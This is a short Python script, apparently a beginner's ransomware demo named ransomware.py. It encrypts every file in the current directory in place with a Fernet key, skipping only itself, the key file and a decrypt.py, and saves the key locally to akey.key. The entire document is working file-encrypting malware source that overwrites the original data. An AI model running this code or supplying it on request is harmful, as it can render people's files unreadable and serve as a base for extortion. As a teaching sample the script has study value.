import os
#https://cryptography.io/en/latest/fernet/
from cryptography.fernet import Fernet


files = []

for file in os.listdir():
    if file == "ransomware.py" or file == "akey.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

key = Fernet.generate_key()

with open("akey.key","wb") as thekey:
	thekey.write(key)


for file in files:
   with open(file,"rb") as thefile:
        contents = thefile.read()
        contents_encrytped = Fernet(key).encrypt(contents)
        print(contents_encrytped)
   with open(file,"wb") as thefile:
        thefile.write(contents_encrytped)
